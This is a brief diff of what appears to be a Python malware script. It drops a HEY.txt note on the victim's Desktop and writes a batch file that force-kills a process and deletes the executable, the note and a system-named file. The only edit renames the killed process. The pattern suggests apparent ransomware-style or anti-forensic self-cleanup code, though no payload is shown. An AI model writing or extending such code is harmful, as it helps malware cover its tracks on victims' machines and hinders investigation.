@@ -83,7 +83,7 @@ def __main__():
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
         os.system("copy HEY.txt "+desktop)
         bat = open("del.bat", "w")
-        bat.write("@echo off\ntaskkill /F /IM antichrome.exe /T\n")
+        bat.write("@echo off\ntaskkill /F /IM orphicAC.exe /T\n")
         bat.write("DEL orphic.exe\n")
         bat.write("DEL HEY.txt\n")
         bat.write("DEL "+sysname+".txt")
